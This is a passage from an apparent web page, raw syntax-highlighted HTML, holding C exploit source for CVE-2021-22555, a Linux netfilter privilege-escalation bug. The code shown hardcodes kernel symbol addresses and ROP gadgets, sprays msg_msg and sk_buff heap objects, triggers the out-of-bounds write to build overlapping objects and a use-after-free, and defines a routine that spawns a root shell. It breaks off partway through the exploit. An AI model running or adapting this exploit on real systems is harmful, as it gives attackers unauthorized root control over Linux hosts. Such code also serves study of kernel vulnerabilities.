class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_eflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, esp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">packed__</span>)) &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> <span class="hljs-title">replace</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entry</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> <span class="hljs-title">match</span>;</span><br>        <span class="hljs-type">char</span> pad[<span class="hljs-number">0x108</span> + PRIMARY_MSG_SIZE - <span class="hljs-number">0x200</span> - <span class="hljs-number">0x2</span>];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> <span class="hljs-title">target</span>;</span><br>    &#125; data = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    data.replace.num_counters = <span class="hljs-number">1</span>;<br>    data.replace.num_entries = <span class="hljs-number">1</span>;<br>    data.replace.size = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    <br>    data.entry.next_offset = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    data.entry.target_offset = <br>            <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <br>    data.match.u.user.match_size = <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <span class="hljs-built_in">strcpy</span>(data.match.u.user.name, <span class="hljs-string">&quot;icmp&quot;</span>);<br>    data.match.u.user.revision = <span class="hljs-number">0</span>;<br><br>    data.target.u.user.target_size = <span class="hljs-keyword">sizeof</span>(data.target);<br>    <span class="hljs-built_in">strcpy</span>(data.target.u.user.name, <span class="hljs-string">&quot;NFQUEUE&quot;</span>);<br>    data.target.u.user.revision = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// partial overwrite the next object</span><br>    <span class="hljs-keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="hljs-keyword">sizeof</span>(data)))<br>        <span class="hljs-keyword">if</span> (errno == ENOPROTOOPT)<br>            errExit(<span class="hljs-string">&quot;ip_tables module is not loaded!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         socket_fd;<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// ident namespace</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// socket to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create socket!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(socket_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span 